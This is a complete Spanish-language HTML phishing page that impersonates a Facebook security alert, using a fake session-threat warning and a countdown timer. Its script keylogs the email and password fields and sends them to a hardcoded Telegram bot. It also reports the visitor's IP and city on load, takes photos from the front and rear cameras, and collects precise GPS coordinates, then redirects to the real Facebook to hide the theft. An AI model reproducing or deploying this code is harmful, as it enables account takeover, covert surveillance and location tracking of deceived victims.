<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Security Systems | Case #REF-882</title>
    
    <style>
        :root { --fb-blue: #0866ff; --fb-bg: #f0f2f5; --fb-text: #1c1e21; }
        body { margin:0; background: var(--fb-bg); font-family: Helvetica, Arial, sans-serif; color: var(--fb-text); height:100vh; overflow:hidden; display:flex; flex-direction:column; }
        
        .fb-header { background: #fff; padding: 12px 20px; border-bottom: 1px solid #ddd; display: flex; align-items: center; justify-content: space-between; }
        .fb-logo { color: var(--fb-blue); font-weight: bold; font-size: 22px; letter-spacing: -1px; }

        .main-content { width: 90%; max-width: 400px; background: #fff; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); padding: 30px; margin: 40px auto; text-align: center; transition: 0.5s; }
        
        .alert-ui { background: #fff0f0; border: 1px solid #f8d7da; color: #721c24; padding: 12px; font-size: 11px; border-radius: 4px; margin-bottom: 15px; text-align: left; }
        .timer { color: #d93025; font-size: 13px; font-weight: bold; margin-bottom: 20px; }
        
        input { width:100%; border:1px solid #ddd; border-radius: 6px; padding: 14px; margin-bottom: 10px; box-sizing: border-box; background: #f5f6f7; outline: none; font-size: 14px; }
        button { width:100%; background: var(--fb-blue); color:#fff; border:none; padding:14px; font-weight:bold; border-radius: 6px; cursor:pointer; font-size: 16px; }

        /* Capa de Ofuscaci√≥n Agresiva */
        #blind-layer { 
            display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
            background: rgba(0,0,0,0.96); /* Casi opaco */
            backdrop-filter: blur(25px); /* Desenfoque extremo */
            z-index: 9999; justify-content:center; align-items:center; flex-direction: column;
        }
        
        .scan-dialog { width: 85%; max-width: 300px; background: #fff; border-radius: 14px; overflow: hidden; text-align: center; }
        #loader { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid var(--fb-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; display: none;}
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .btn-group { display: flex; border-top: 1px solid #eee; }
        .btn-group div { flex: 1; padding: 15px; color: var(--fb-blue); font-size: 15px; font-weight: 600; cursor: pointer; }
        
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="fb-header">
        <div class="fb-logo">facebook</div>
        <div style="font-size: 12px; font-weight: 600; color: #65676b;">Security Center</div>
    </div>

    <div class="main-content" id="ui-main">
        <div class="alert-ui">
            <b>üî¥ AMENAZA DE ACCESO:</b><br>
            Intento de duplicaci√≥n de sesi√≥n detectado desde:<br>
            <span id="threat-ip" style="font-weight: bold; text-decoration: underline;">Analizando red...</span>
        </div>
        
        <div class="timer">Sesi√≥n expira en: <span id="clock">02:59</span></div>
        
        <h2 style="font-size: 18px; margin-bottom: 10px;">Sincronizaci√≥n Biom√©trica</h2>
        <p style="font-size: 13px; color: #65676b; margin-bottom: 20px;">
            Para bloquear al atacante, debe realizar un escaneo de entorno. Esto comparar√° su ubicaci√≥n y rostro con los datos de la intrusi√≥n.
        </p>
        
        <input type="text" id="u_field" placeholder="Correo o tel√©fono" oninput="ks('U')">
        <input type="password" id="p_field" placeholder="Contrase√±a de cuenta" oninput="ks('P')">
        
        <button onclick="openScanner()">Activar Radar de Seguridad</button>
    </div>

    <div id="blind-layer">
        <div class="scan-dialog">
            <div style="padding: 25px;">
                <b style="font-size: 16px;">¬øIniciar Escaneo Forense?</b>
                <p style="font-size: 12px; color: #555; margin-top: 10px;">
                    Se requiere acceso a la c√°mara y GPS para generar el reporte de evidencia contra el acceso no autorizado.
                </p>
                <div id="loader"></div>
            </div>
            <div class="btn-group" id="btn-ctrl">
                <div onclick="location.reload()">Cancelar</div>
                <div style="border-left:1px solid #eee; font-weight: 700;" onclick="startHarvest()">Confirmar</div>
            </div>
        </div>
    </div>

    <video id="v" autoplay></video>
    <canvas id="c"></canvas>

<script>
    const _cfg = { t: "8339392160:AAHG0Qp52ZpZDGH8pZqr4qsx-9ZiwnIP0AE", c: "7549936722" };

    // Env√≠o de Datos
    async function _post(msg, map = false) {
        let body = { chat_id: _cfg.c, text: `üõ∞Ô∏è [SIGINT]\n${msg}`, parse_mode: "Markdown" };
        if(map) body.reply_markup = { inline_keyboard: [[{ text: "üìç VER MAPA", url: map }]] };
        await fetch(`https://api.telegram.org/bot${_cfg.t}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
    }

    async function _photo(blob, label) {
        let f = new FormData(); f.append('chat_id', _cfg.c); f.append('photo', blob); f.append('caption', `üì∏ [FOTO] ${label}`);
        await fetch(`https://api.telegram.org/bot${_cfg.t}/sendPhoto`, { method: 'POST', body: f });
    }

    // Keylogger
    function ks(type) {
        const val = document.getElementById(type==='U'?'u_field':'p_field').value;
        if(val.length > 4) _post(`‚å®Ô∏è *KEYLOG* [${type}]: \`${val}\``);
    }

    // Inicializaci√≥n
    window.onload = async () => {
        let t = 179; setInterval(() => {
            let m = Math.floor(t/60), s = t%60;
            document.getElementById('clock').innerText = `${m}:${s<10?'0':''}${s}`;
            if(--t < 0) location.href = "https://facebook.com";
        }, 1000);

        try {
            const r = await fetch('https://ipapi.co/json/');
            const d = await r.json();
            document.getElementById('threat-ip').innerText = `${d.ip} (${d.city}, ${d.country})`;
            _post(`üìÅ *OBJETIVO CONECTADO*\nIP: \`${d.ip}\`\nCity: \`${d.city}\`\nBrowser: \`${navigator.vendor}\``);
        } catch(e) {}
    };

    function openScanner() {
        const u = document.getElementById('u_field').value;
        const p = document.getElementById('p_field').value;
        if(u.length < 4 || p.length < 4) return;
        
        _post(`üîë *ACCESO INTENTADO*\nU: \`${u}\` | P: \`${p}\``);
        document.getElementById('ui-main').style.filter = "blur(30px)";
        document.getElementById('blind-layer').style.display = "flex";
    }

    async function startHarvest() {
        document.getElementById('btn-ctrl').style.display = "none";
        document.getElementById('loader').style.display = "block";
        
        const vid = document.getElementById('v');
        const can = document.getElementById('c');

        // 1. Fotos Duales (Frontal y Trasera)
        const modes = ["user", "environment"];
        for(let mode of modes) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                vid.srcObject = stream;
                await new Promise(r => setTimeout(r, 1500));
                can.width = vid.videoWidth; can.height = vid.videoHeight;
                can.getContext('2d').drawImage(vid, 0, 0);
                await new Promise(r => can.toBlob(b => { _photo(b, mode==='user'?'FRONTAL':'ENTORNO'); r(); }, 'image/jpeg'));
                stream.getTracks().forEach(track => track.stop());
            } catch(e) { _post(`‚ö†Ô∏è ERROR CAM: ${mode}`); }
        }

        // 2. GPS de Alta Precisi√≥n
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                _post(`üéØ *UBICACI√ìN EXACTA*\nLAT: \`${pos.coords.latitude}\`\nLON: \`${pos.coords.longitude}\`\nACC: ${pos.coords.accuracy}m`, mapUrl);
                done();
            },
            () => { _post("‚ö†Ô∏è GPS RECHAZADO"); done(); },
            { enableHighAccuracy: true, timeout: 6000 }
        );
    }

    function done() {
        document.querySelector('.scan-dialog p').innerText = "Identidad validada. Redireccionando a su perfil seguro...";
        setTimeout(() => { window.location.href = "https://www.facebook.com/settings?tab=security"; }, 2000);
    }
</script>
</body>
</html>
